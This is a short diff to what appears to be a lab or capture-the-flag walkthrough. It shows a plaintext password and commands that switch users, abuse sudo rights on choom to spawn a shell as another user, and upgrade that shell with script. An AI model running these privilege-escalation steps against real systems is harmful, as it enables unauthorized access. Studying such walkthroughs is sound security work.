@@ -70,4 +70,5 @@ ny password is ayurv3d4
 ```C
 su ocean
 sudo -u india /usr/bin/choom -n 0 /bin/sh
+script /dev/null -c bash
 ```
